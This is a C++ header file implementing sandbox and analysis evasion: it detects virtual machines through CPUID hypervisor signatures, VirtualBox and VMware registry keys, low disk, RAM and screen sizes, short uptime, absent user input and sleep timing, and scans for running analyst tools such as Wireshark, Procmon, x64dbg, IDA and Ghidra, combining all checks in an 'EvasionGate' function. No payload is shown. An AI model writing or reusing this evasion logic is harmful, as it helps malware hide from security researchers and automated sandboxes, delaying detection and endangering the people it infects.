#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <intrin.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <cstdint>

#ifndef BENCH
#define BENCH 0
#endif

inline bool Vm_CpuId() {
    int r[4]{};
    __cpuid(r, 0x40000000);
    char brand[13]{};
    memcpy(brand,   &r[1], 4);
    memcpy(brand+4, &r[2], 4);
    memcpy(brand+8, &r[3], 4);
    const char* sigs[] = {"VMwareVMware","KVMKVMKVM\0\0\0","VBoxVBoxVBox",
                          "XenVMMXenVMM","TCGTCGTCGTCG", nullptr};
    for (int i = 0; sigs[i]; i++)
        if (memcmp(brand, sigs[i], 12) == 0) return true;
    return false;
}

inline bool Vm_Registry() {
    const char* keys[] = {
        "HARDWARE\\ACPI\\DSDT\\VBOX__",
        "HARDWARE\\ACPI\\FADT\\VBOX__",
        "HARDWARE\\ACPI\\RSDT\\VBOX__",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\ControlSet001\\Services\\VBoxGuest",
        "SYSTEM\\ControlSet001\\Services\\vmhgfs",
        "SYSTEM\\ControlSet001\\Services\\vmmemctl",
        "SYSTEM\\ControlSet001\\Services\\vmrawdsk",
        "SYSTEM\\ControlSet001\\Services\\vmusbmouse",
        "SYSTEM\\ControlSet001\\Services\\vmx_svga",
        nullptr
    };
    for (int i = 0; keys[i]; i++) {
        HKEY hk;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keys[i], 0, KEY_READ, &hk) == ERROR_SUCCESS) {
            RegCloseKey(hk); return true;
        }
    }
    return false;
}

inline bool Vm_Processes() {
    const wchar_t* bad[] = {
        L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe", L"vmwaretray.exe",
        L"vmwareuser.exe",  L"vmacthlp.exe", L"vmsrvc.exe",   L"vmusrvc.exe",
        L"xenservice.exe",  L"qemu-ga.exe",  L"wireshark.exe",L"fiddler.exe",
        L"procmon.exe",     L"procmon64.exe",L"processhacker.exe",
        L"x32dbg.exe",      L"x64dbg.exe",   L"ollydbg.exe",
        L"idaq.exe",        L"idaq64.exe",   L"ida.exe",      L"ida64.exe",
        L"ghidra.exe",      L"dnspy.exe",    L"de4dot.exe",
        nullptr
    };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            for (int i = 0; bad[i] && !found; i++)
                if (_wcsicmp(pe.szExeFile, bad[i]) == 0) found = true;
        } while (!found && Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

inline bool Vm_DiskSize() {
    ULARGE_INTEGER total{};
    GetDiskFreeSpaceExW(L"C:\\", nullptr, &total, nullptr);
    return total.QuadPart < (30ULL * 1024 * 1024 * 1024);
}

inline bool Vm_Ram() {
    MEMORYSTATUSEX ms{}; ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    return ms.ullTotalPhys < (4ULL * 1024 * 1024 * 1024);
}

inline bool Vm_Screen() {
    return GetSystemMetrics(SM_CXSCREEN) < 800 || GetSystemMetrics(SM_CYSCREEN) < 600;
}


inline bool Env_Uptime() {
    return GetTickCount64() < (5ULL * 60 * 1000);
}

inline bool Env_NoUserInput() {
    LASTINPUTINFO li{}; li.cbSize = sizeof(li);
    if (!GetLastInputInfo(&li)) return false;
    return li.dwTime == 0;
}

inline bool Env_Timing() {
    LARGE_INTEGER a, b, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&a);
    Sleep(5);
    QueryPerformanceCounter(&b);
    double ms = (double)(b.QuadPart - a.QuadPart) / freq.QuadPart * 1000.0;
    return ms > 1500.0;
}

inline bool EvasionGate() {
#if BENCH
    return true;
#else
    if (Vm_CpuId())        return false;
    if (Vm_Registry())     return false;
    if (Vm_Processes())    return false;
    if (Vm_DiskSize())     return false;
    if (Vm_Ram())          return false;
    if (Vm_Screen())       return false;
    if (Env_Uptime())      return false;
    if (Env_NoUserInput()) return false;
    if (Env_Timing())      return false;
    return true;
#endif
}
